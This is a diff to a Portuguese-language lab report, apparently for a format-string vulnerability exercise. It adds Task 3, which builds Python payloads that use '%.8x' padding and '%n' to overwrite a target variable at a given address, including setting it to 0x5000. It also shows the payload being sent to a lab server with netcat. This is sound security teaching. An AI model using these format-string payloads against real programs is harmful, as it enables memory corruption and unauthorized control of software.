@@ -52,7 +52,7 @@ content[4:8]  =  ("abcd").encode('latin-1')
 
 # This line shows how to construct a string s with
 #   12 of "%.8x", concatenated with a "%n"
-s = "%.8x"*25 + "%n" # alteraçâo do número de "%.8x"
+s = "%.8x"*25 + "%n" # alteração do número de "%.8x"
 
 # The line shows how to store the string s at offset 8
 fmt  = (s).encode('latin-1')
@@ -79,8 +79,8 @@ $ cat badfile | nc 10.9.0.5 9090
 - Após algumas tentativas, chegámos à conclusão de que foram necessários 64 especificadores de formato `%x` para acessar a localização da stack onde o valor estava alocado.
 
 ```py
-unique_value = 0xdeadbeef
-content[0:4]  =  (unique_value).to_bytes(4,byteorder='little')
+number = 0xdeadbeef
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
 
 s = "%.8x"*64
 ```
@@ -105,5 +105,31 @@ s = "%.8x"*63 + "%s"
 
 ## Task 3
 
-## Task 3.A
+### Task 3.A
+
+- Temos a informação do endereço da "target variable": `0x080e5068`
+
+- O seu conteúdo é `0x11223344` e temos como objetivo mudar para outro valor. A tática é então muito semelhante à anterior, com a diferença de que desta vez escrevemos no endereço.
+
+```py
+number = 0x080e5068
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+s = "%.8x"*63 + "%n"
+```
+
+![image](screenshots/LB6_3.png)
+
+### Task 3.B
+
+- Para mudarmos o valor do endereço `target` para `0x5000` é necessário um maior controle de caracteres impressos antes do especificador `%n`.
+
+- Convertendo `0x5000` para decimal obtemos o valor `20480`. Isto indica que é necessário imprimirmos essa quantidade de caracteres antes de usarmos `%n`.
+
+```py
+s = "%19976x" + "%.8x" * 62 + "%n"
+```
+
+![image](screenshots/LB6_4.png)
+
 
